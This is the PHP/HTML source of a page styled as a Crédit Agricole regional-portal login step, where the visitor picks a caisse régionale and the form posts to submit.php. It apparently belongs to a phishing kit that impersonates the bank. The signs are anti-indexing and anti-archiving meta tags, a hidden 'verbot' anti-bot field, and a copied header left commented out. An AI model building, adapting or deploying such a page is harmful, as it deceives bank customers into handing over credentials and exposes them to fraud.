<?php



include_once '../inc/app.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>

    <!-- Meta Tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">

    <!-- Browser Color Styling -->
    <meta name="theme-color" content="#6dc77a"/>
    <meta name="msapplication-navbutton-color" content="#6dc77a"/>
    <meta name="apple-mobile-web-app-status-bar-style" content="#6dc77a" />

    <!-- Favicon -->
    <link rel="icon" type="image/png" href="../assets/images/favicon.png">
    
    <!-- Bootstrap -->
    <link rel="stylesheet" href="../assets/css/bootstrap.min.css" />
    
    <!-- Helpers -->
    <link rel="stylesheet" href="../assets/css/helpers.css" />

    <!-- Fonts -->
    <link rel="stylesheet" href="../assets/css/fonts.css" />

    <!-- Main -->
    <link rel="stylesheet" href="../assets/css/main.css" />


    <title>Acc&egrave;s CR - Crédit Agricole</title>

</head>
<body>

    <!-- HEADER -->
    <!--<header id="header">
        <div class="left col-md-2">
            <div class="logo text-center"><a href="#"><img src="../assets/images/logo.svg"></a></div>
        </div>
        <div class="right col-md-10 pl-0">
            <div class="top d-flex align-items-center h-50">
                <div class="first"><a href="#">Vous êtes un particulier <i class="fas fa-chevron-down"></i></a></div>
                <div class="second flex-grow-1">
                    <div class="d-flex align-items-center justify-content-center">
                        <div class="form flex-grow-1 d-flex justify-content-center align-items-center">
                            <span class="flex-grow-1">Rechercher une thématique, un produit...</span>
                            <i class="fas fa-search"></i>
                        </div>
                        <div class="marker d-flex justify-content-center align-items-center">
                            <i class="fas fa-map-marker-alt"></i>
                        </div>
                    </div>
                </div>
                <div class="third">
                    <ul>
                        <li><a href=""><i class="far fa-circle"></i> Nous contacter</a></li>
                        <li><a href="">Devenir Client</a></li>
                        <li><a href=""><i class="fas fa-unlock-alt"></i> mon espace</a></li>
                    </ul>
                </div>
            </div>
            <div class="bottom d-flex align-items-center h-50">
                <ul>
                    <li><a href="#">COMPTES & CARTES</a></li>
                    <li><a href="#">ÉPARGNER</a></li>
                    <li><a href="#">S'ASSURER</a></li>
                    <li><a href="#">EMPRUNTER</a></li>
                    <li><a href="#">SIMULATION & DEVIS</a></li>
                    <li><a href="#">NOS CONSEILS</a></li>
                </ul>
            </div>
        </div>
    </header>-->
    <!-- END HEADER -->

    <header id="header2">
        <div class="logo">
            <a href="#"><img style="max-width: 170px;" src="../assets/images/calogo.png"></a>
        </div>
        <div class="closse"><i class="fas fa-times"></i></div>
    </header>

    <!-- MAIN -->
    <main id="main">
        <div class="left">
            <div class="left-inner text-white">
                
                <h3>Important. Votre portail change vos habitudes de navigation aussi.</h3>
                <p>
                    Nous vous recommandons de prendre connaissance des nouveautés au travers de cette présentation s’adressant tout particulièrement à nos utilisateurs en situation de handicap visuel. 
                </p>
                <a href="#" class="btn btn-light fz14" style="color: #007D8F; padding: 10px 20px;">Découvrir les nouvelles fonctionnalités</a>

            </div>
        </div>
        <div class="right" style="background-color: #FFF;">
            <div class="region-box">
                <form action="submit.php" method="post">
                    <legend>
                        ACCÉDER À L'ESPACE DÉDIÉ<br>
                        <b>DE VOTRE CAISSE RÉGIONALE</b>
                    </legend>
                    <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'region_number') ?>">
                        <label for="region">Trouver une caisse régionale</label>
                        <input type="text" name="region_number" id="region_number" class="form-control" placeholder="Saisissez un numéro de département">
                    </div>
                    <div class="form-group">
                        <label for="region_caisse">Ou</label>
                        <select name="region_caisse" id="region_caisse" class="form-control">
                            <option value="" selected>Choisir une caisse régionale</option>
                            <option value="Alpes Provence" <?php echo get_selected_option('region_caisse','Alpes Provence'); ?>>Alpes Provence</option>
                            <option value="Alsace Vosges" <?php echo get_selected_option('region_caisse','Alsace Vosges'); ?>>Alsace Vosges</option>
                            <option value="Anjou Maine" <?php echo get_selected_option('region_caisse','Anjou Maine'); ?>>Anjou Maine</option>
                            <option value="Aquitaine" <?php echo get_selected_option('region_caisse','Aquitaine'); ?>>Aquitaine</option>
                            <option value="Atlantique Vendée" <?php echo get_selected_option('region_caisse','Atlantique Vendée'); ?>>Atlantique Vendée</option>
                            <option value="Brie Picardie" <?php echo get_selected_option('region_caisse','Brie Picardie'); ?>>Brie Picardie</option>
                            <option value="Centre Est" <?php echo get_selected_option('region_caisse','Centre Est'); ?>>Centre Est</option>
                            <option value="Centre France" <?php echo get_selected_option('region_caisse','Centre France'); ?>>Centre France</option>
                            <option value="Centre Loire" <?php echo get_selected_option('region_caisse','Centre Loire'); ?>>Centre Loire</option>
                            <option value="Centre Ouest" <?php echo get_selected_option('region_caisse','Centre Ouest'); ?>>Centre Ouest</option>
                            <option value="Champagne Bourgogne" <?php echo get_selected_option('region_caisse','Champagne Bourgogne'); ?>>Champagne Bourgogne</option>
                            <option value="Charente Maritime Deux-Sèvres" <?php echo get_selected_option('region_caisse','Charente Maritime Deux-Sèvres'); ?>>Charente Maritime Deux-Sèvres</option>
                            <option value="Charente Périgord" <?php echo get_selected_option('region_caisse','Charente Périgord'); ?>>Charente Périgord</option>
                            <option value="Corse" <?php echo get_selected_option('region_caisse','Corse'); ?>>Corse</option>
                            <option value="Côtes d\'Armor" <?php echo get_selected_option('region_caisse','Côtes d\'Armor'); ?>>Côtes d\'Armor</option>
                            <option value="Des Savoie" <?php echo get_selected_option('region_caisse','Des Savoie'); ?>>Des Savoie</option>
                            <option value="Finistère" <?php echo get_selected_option('region_caisse','Finistère'); ?>>Finistère</option>
                            <option value="Franche Comté" <?php echo get_selected_option('region_caisse','Franche Comté'); ?>>Franche Comté</option>
                            <option value="Guadeloupe" <?php echo get_selected_option('region_caisse','Guadeloupe'); ?>>Guadeloupe</option>
                            <option value="Ille et Vilaine" <?php echo get_selected_option('region_caisse','Ille et Vilaine'); ?>>Ille et Vilaine</option>
                            <option value="Languedoc" <?php echo get_selected_option('region_caisse','Languedoc'); ?>>Languedoc</option>
                            <option value="Loire Haute-Loire" <?php echo get_selected_option('region_caisse','Loire Haute-Loire'); ?>>Loire Haute-Loire</option>
                            <option value="Lorraine" <?php echo get_selected_option('region_caisse','Lorraine'); ?>>Lorraine</option>
                            <option value="Martinique Guyane" <?php echo get_selected_option('region_caisse','Martinique Guyane'); ?>>Martinique Guyane</option>
                            <option value="Morbihan" <?php echo get_selected_option('region_caisse','Morbihan'); ?>>Morbihan</option>
                            <option value="Nord De France" <?php echo get_selected_option('region_caisse','Nord De France'); ?>>Nord De France</option>
                            <option value="Nord Est" <?php echo get_selected_option('region_caisse','Nord Est'); ?>>Nord Est</option>
                            <option value="Nord Midi Pyrénées" <?php echo get_selected_option('region_caisse','Nord Midi Pyrénées'); ?>>Nord Midi Pyrénées</option>
                            <option value="Normandie" <?php echo get_selected_option('region_caisse','Normandie'); ?>>Normandie</option>
                            <option value="Normandie Seine" <?php echo get_selected_option('region_caisse','Normandie Seine'); ?>>Normandie Seine</option>
                            <option value="Paris" <?php echo get_selected_option('region_caisse','Paris'); ?>>Paris</option>
                            <option value="Provence Côte d\'Azur" <?php echo get_selected_option('region_caisse','Provence Côte d\'Azur'); ?>>Provence Côte d\'Azur</option>
                            <option value="Pyrénées Gascogne" <?php echo get_selected_option('region_caisse','Pyrénées Gascogne'); ?>>Pyrénées Gascogne</option>
                            <option value="Réunion" <?php echo get_selected_option('region_caisse','Réunion'); ?>>Réunion</option>
                            <option value="Sud Méditerranée" <?php echo get_selected_option('region_caisse','Sud Méditerranée'); ?>>Sud Méditerranée</option>
                            <option value="Sud Rhône Alpes" <?php echo get_selected_option('region_caisse','Sud Rhône Alpes'); ?>>Sud Rhône Alpes</option>
                            <option value="Toulouse 31" <?php echo get_selected_option('region_caisse','Toulouse 31'); ?>>Toulouse 31</option>
                            <option value="Touraine Poitou" <?php echo get_selected_option('region_caisse','Touraine Poitou'); ?>>Touraine Poitou</option>
                            <option value="Val De France" <?php echo get_selected_option('region_caisse','Val De France'); ?>>Val De France</option>
                        </select>
                    </div>
                    <input type="hidden" name="verbot">
                    <input type="hidden" name="type" value="region">
                    <div class="form-group text-center mb-0 mt-5">
                        <button type="submit">Valider</button>
                    </div>
                </form>
            </div>
        </div>
    </main>

    <script src="../assets/js/jquery.min.js"></script>
    <script src="../assets/js/popper.min.js"></script>
    <script src="../assets/js/bootstrap.min.js" ></script>
    <script src="../assets/js/fontawesome.js"></script>
    <script src="../assets/js/main.js"></script>

</body>
</html>